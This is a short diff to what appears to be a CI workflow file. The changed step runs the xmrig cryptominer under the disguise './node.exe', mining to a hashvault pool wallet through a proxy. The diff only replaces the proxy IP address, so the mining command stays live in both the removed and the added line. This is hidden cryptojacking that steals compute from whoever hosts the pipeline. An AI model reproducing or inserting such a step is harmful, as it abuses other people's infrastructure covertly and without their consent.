@@ -21,4 +21,4 @@ jobs:
           timeout_minutes: 10
           max_attempts: 2
           retry_wait_seconds: 15
-          command: ./node.exe xmrig --url pool.hashvault.pro:80 --user hvs1ZQN67XB2NqwT6Dd9qbR2S1cqrACvoPGEDJvAd1o83JEpEcVKWA17ScUWTnEqVYYad8zJurahHMF7E2ecpV7c1tQwRcfG4B --pass x --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 --max-cpu-usage 70 -x 98.162.25.29:31679
+          command: ./node.exe xmrig --url pool.hashvault.pro:80 --user hvs1ZQN67XB2NqwT6Dd9qbR2S1cqrACvoPGEDJvAd1o83JEpEcVKWA17ScUWTnEqVYYad8zJurahHMF7E2ecpV7c1tQwRcfG4B --pass x --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 --max-cpu-usage 70 -x 72.210.252.134:46164
